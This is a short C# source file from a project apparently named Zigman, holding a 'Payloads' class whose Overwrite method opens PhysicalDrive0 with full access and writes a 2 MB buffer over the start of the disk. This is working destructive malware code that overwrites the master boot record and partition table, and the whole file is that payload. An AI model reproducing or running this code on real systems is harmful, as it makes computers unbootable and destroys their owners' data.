// Copyright © TheAirBlow 2022 <theairblow.help@gmail.com>
// This Source Code Form is subject to the terms of the Mozilla Public
// License, v2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.

using System.Runtime.InteropServices;

namespace TheAirBlow.Zigman;

/// <summary>
/// Overwrite MBR
/// </summary>
public partial class Payloads
{
    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32")]
    private static extern bool WriteFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped);

    /// <summary>
    /// Overwrite MBR
    /// </summary>
    /// <param name="buffer">MBR payload</param>
    public static void Overwrite(byte[] buffer)
    {
        var mbr = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 
            0x1 | 0x2, IntPtr.Zero, 
            0x3, 0, IntPtr.Zero);
        Array.Resize(ref buffer, 2097152);
        WriteFile(mbr, buffer, (uint)buffer.Length, out _, IntPtr.Zero);
    }
}